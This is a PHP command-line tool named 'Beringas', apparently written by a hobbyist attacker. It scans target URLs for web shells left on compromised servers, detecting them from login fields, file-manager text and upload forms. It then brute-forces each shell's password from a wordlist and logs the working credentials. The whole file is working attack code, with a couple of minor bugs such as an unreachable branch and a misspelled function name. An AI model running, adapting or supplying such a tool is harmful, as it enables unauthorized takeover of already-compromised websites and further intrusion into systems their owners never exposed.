<?php
//"authorName":"yuss"
//"contactAuthor":"yus17726@gmail.com"
//"facebookAuthor":"http://facebook.com/yus.127.0.0.1"

error_reporting(E_ALL^(E_NOTICE));

print "
             /\
            ( ;`~v/~~~ ;._
         ,/'\"/^) ' < o\  '\".~'\\\--,
       ,/\",/W  u '`. ~  >,._..,   )'
      ,/'  w  ,U^v  ;//^)/')/^\;~)'
   ,/\"'/   W` ^v  W |;         )/'
 ;''  |  v' v`\" W }  \\
\"    .'\    v  `v/^W,) '\)\.)\/)
                   `\   ,/,)'   ''')/^\"-;'
                        \
                         '\". _
-------------------------------------------
//Beringas is a WebShell Checker Tools and Break The Password
//Created by Yuss
//If you have a list, break your list with [ENTER] and type your file list name and you can type any file list name like this -> list1.txt|list2.txt (explode it with | symbol)
//If you haven't a list you just type the url only bitch
//Then if the WebShell status is Founded you can choose if you want to crack the tools or not 
";

echo "Enter the target : ";
$list = trim(fgets(STDIN));

function crotz($x)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_URL, $x);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    $output = curl_exec($ch);
    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    if($status == 200)
    {
        preg_match("|<input type=\"password\" name=\"(.*?)\"|", $output, $password);
        preg_match("|File Manager|", $output, $fm);
        preg_match("|<input type=\"file\" |", $output, $upload);

        if(!empty($password))
        {
            $password = $password[1];
            echo "\nFounded a webshell at ".$x."\nDo you want to login? [Y/n] [default = n (NO)] ";
            $answer = trim(fgets(STDIN));

            if(($answer == "y") || $answer == "Y")
            {
                unlink('cook.txt');
                echo "Type your pass : ";
                $pass = trim(fgets(STDIN));

                if(strpos($pass, ".txt"))
                {
                    $open = fopen("$pass", "r");
                    $size = filesize("$pass");
                    $read = fread($open, $size);
                    $passwd = explode("\n", $read);

                    foreach($passwd as $key)
                    {
                        if(!empty($key))
                        {
                            curl_setopt($ch, CURLOPT_URL, $x);
                            curl_setopt($ch, CURLOPT_HEADER, 0);
                            curl_setopt($ch, CURLOPT_COOKIEJAR, 'cook.txt');
                            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                            curl_setopt($ch, CURLOPT_POST, true);
                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                            curl_setopt($ch, CURLOPT_POSTFIELDS, "pass=".$key);
                            $output = curl_exec($ch);
                            preg_match("|<input type=\"password\" name=\"(.*?)\"|", $output, $pswd);

                            if(!empty($pswd))
                            {
                                $end = fopen("shell_die.txt", "a+");
                                fwrite($end, "\n[DIE] Shell at ".$x." password : ".$key);
                                print "[".date('H:m:s')."] [DIE] Shell at ".$x." can't matching the password with ".$key."\n";
                                fclose($end);
                            } else if(empty($pswd))
                            {
                                $end = fopen("shell_result.txt", "a+");
                                fwrite($end, "\n[LIVE] Shell at ".$x." password : ".$key);
                                print "\n[".date('H:m:s')."] [LIVE] Shell at ".$x."\n is ok with ".$key."\n\n";
                                fclose($end);
                            }
                        }
                    }
                } else if(!strpos($pass, ".txt"))
                {
                    curl_setopt($ch, CURLOPT_URL, $x);
                    curl_setopt($ch, CURLOPT_HEADER, 0);
                    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cook.txt');
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, "pass=".$pass);
                    $output = curl_exec($ch);
                    preg_match("|<input type=\"password\" name=\"(.*?)\"|", $output, $pswd);

                    if(!empty($pswd))
                    {
                        $end = fopen("shell_die.txt", "a+");
                        fwrite($end, "\n[DIE] Shell at ".$x." password : ".$pass);
                        print "\n[".date('H:m:s')."] [DIE] Shell at ".$x." can't matching the password with ".$pass."\n";
                        fclose($end);
                    } else if(empty($pswd))
                    {
                        $end = fopen("shell_result.txt", "a+");
                        fwrite($end, "\n[LIVE] Shell at ".$x." password : ".$pass);
                        print "\n[".date('H:m:s')."] [LIVE] Shell at ".$x."\n is ok with ".$pass."\n\n";
                        fclose($end);
                    }
                }
            }
        }
    } else if(!empty($status) && $status != 200)
    {
        echo "[DIE] Sorry, but the shell at ".$x." isn't found\n";
    }
}

if(strpos($list, ".txt")) 
{
    $open = fopen("$list", "r");
    $size = filesize("$list");
    $read = fread($open, $size);
    $url = explode("\n", $read);

    foreach($url as $host)
    {
        crotz($host);
    }
} else if(strpos($list, ".txt") && strpost($list, "|"))
{
    $explode = explode("|", $list);

    foreach($explode as $lists)
    {
        $open = fopen("$lists", "r");
        $size = filesize("$lists");
        $read = fread($open, $size);
        $url = explode("\n", $read);

        foreach($url as $host)
        {
                crotz($host);
        }
    }
} else
{
    crotz($list);
}

?>
